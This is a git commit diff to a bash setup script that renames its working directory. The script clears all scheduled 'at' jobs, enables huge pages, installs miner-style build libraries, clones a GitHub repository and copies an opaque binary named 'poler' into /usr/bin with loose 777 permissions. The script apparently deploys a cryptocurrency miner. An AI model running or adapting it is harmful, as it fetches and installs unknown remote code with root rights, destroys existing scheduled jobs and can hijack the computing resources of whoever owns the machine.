73f932c40697157e9a675caf2e41936163bc7932
burkabest <52100051+burkabest@users.noreply.github.com>
2019-10-10 08:26:04 -0300

    Update belya.sh

--- belya.sh
+++ belya.sh
@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/work1/
+rm -rf /tmp/workstore1/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir work1
-git clone https://github.com/burkabest/work1.git /tmp/work1
-cd /tmp/work1
-chmod +x /tmp/work1/poler
+cd /tmp && mkdir workstore1
+git clone https://github.com/burkabest/workstore1.git /tmp/workstore1
+cd /tmp/workstore1
+chmod +x /tmp/workstore1/poler
 chmod 777 ./*.sh
-cp /tmp/work1/poler /usr/bin/
+cp /tmp/workstore1/poler /usr/bin/
 
 sudo apt-get install dos2unix
 sudo dos2unix time1.sh
